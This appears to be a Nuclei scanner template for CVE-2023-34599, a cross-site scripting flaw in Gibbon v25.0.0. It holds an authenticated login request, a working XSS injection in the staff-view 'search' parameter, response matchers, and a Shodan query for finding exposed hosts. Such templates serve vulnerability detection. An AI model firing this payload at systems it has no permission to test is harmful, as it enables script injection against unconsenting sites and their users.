id: CVE-2023-34599

info:
  name: Gibbon v25.0.0 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Multiple Cross-Site Scripting (XSS) vulnerabilities have been identified in Gibbon v25.0.0, which enable attackers to execute arbitrary Javascript code.
  reference:
    - https://github.com/maddsec/CVE-2023-34599
    - https://vulmon.com/searchpage?q=CVE-2023-34599
  classification:
    cve-id: CVE-2023-34599
  metadata:
    max-request: 2
    shodan-query: http.favicon.hash:-165631681
  tags: cve,cve2023,gibbon,xss,authenticated

http:
  - raw:
      - |
        POST /login.php? HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8m88nqhR1NAnQEYZ

        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="address"


        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="method"

        default
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="username"

        {{username}}
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="password"

        {{password}}
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="gibbonSchoolYearID"

        017
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="gibboni18nID"

        0001
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ--

      - |
        GET /index.php?q=/modules/Staff/staff_view_details.php&gibbonTTID=00000010&gibbonPersonID=0000000001&search=yyraq'><script>alert(document.domain)</script>oq7c8fmwwro&ttDate=05/23/2023&schoolCalendar=N&personalCalendar=N&spaceBookingCalendar=N&fromTT=Y HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - '><script>alert(document.domain)</script>'
          - 'gibbon'
        condition: and
        case-insensitive: true

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
